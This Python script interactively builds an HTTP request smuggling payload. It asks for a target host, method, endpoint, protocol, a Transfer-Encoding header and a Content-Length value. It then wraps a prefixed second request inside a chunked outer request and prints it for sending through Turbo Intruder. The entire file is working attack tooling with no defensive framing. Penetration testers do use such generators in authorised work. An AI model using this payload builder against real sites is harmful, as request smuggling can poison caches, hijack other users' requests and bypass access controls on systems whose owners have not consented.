RN = "\r\n"

# -- Normal Request Parameters
print("\n __________________________\n|Customising normal request|\n --------------------------\n")

the_host = input("Enter the host (ex: target.com)\n~> ")
smuggle_gadget = input("Enter TE header (ex: Transfer-Encoding: chunked)\n~> ")
the_verb = input("Enter HTTP Method (ex: POST)\n~> ")
the_ep = input("Enter the directory or endpoint (ex: /directory or /directory.php?id=1)\n~> ")
the_protocol = input ("Enter HTTP Protocol (HTTP/1.1 or HTTP/2)\n~> ")

TheHost               = str(the_host)
SmuggleGadget         = str(smuggle_gadget)
TheVerb               = str(the_verb)
TheEP                 = str(the_ep)
TheProtocol           = str(the_protocol)

print("\n ____________________________\n|Customising Smuggled Request|\n ----------------------------\n")

prefix_verb = input("Enter HTTP Method (ex: POST)\n~> ")
prefix_ep = input("Enter the directory [default: /hopefully404]\n~> ")
if prefix_ep == "":
    final_ep = "/hopefully404"
else:
    final_ep = prefix_ep
    

prefix_length = input("Enter Content-Length value (ex: 300)\n~> ")


# -- Smuggled Request Parameters
PrefixVerb            = str(prefix_verb)
PrefixEP              = str(final_ep)
PrefixProtocol        = str(the_protocol)
PrefixHost            = str(the_host)
PrefixLength          = str(prefix_length)

#uncomment the following lines if you want to add them in smuggled request
prefix  = ("%s %s %s" % (PrefixVerb, PrefixEP, PrefixProtocol)) + RN
prefix += ("Host: %s" % (PrefixHost)) + RN
#prefix += "Accept-Encoding: gzip, deflate" + RN
#prefix += "Accept: */*" + RN
#prefix += "Accept-Language: en" + RN
#preffix += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" + RN
prefix += "Content-Type: application/x-www-form-urlencoded" + RN
prefix += ("Content-Length: %s" % (PrefixLength)) + RN
prefix += RN
prefix += "x=1"

sz = hex(len(prefix))[2:]

smuggle  = ("%s %s %s" % (TheVerb, TheEP, TheProtocol)) + RN
smuggle += SmuggleGadget + RN
smuggle += ("Host: %s" % (TheHost)) + RN
smuggle += ("Content-length: %s" % (str(2+len(sz)))) + RN
smuggle += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" + RN
smuggle += "Accept-Encoding: gzip, deflate" + RN
smuggle += "Connection: keep-alive" + RN
smuggle += "Content-Type: application/x-www-form-urlencoded" + RN
smuggle += RN + ("%s"%(sz)) + RN
smuggle += prefix + RN + "0" + RN + RN

print("\n ____________________\n|The smuggled Payload|\n --------------------\nSend the following request in Turbo-Intruder:\n")
print(smuggle)
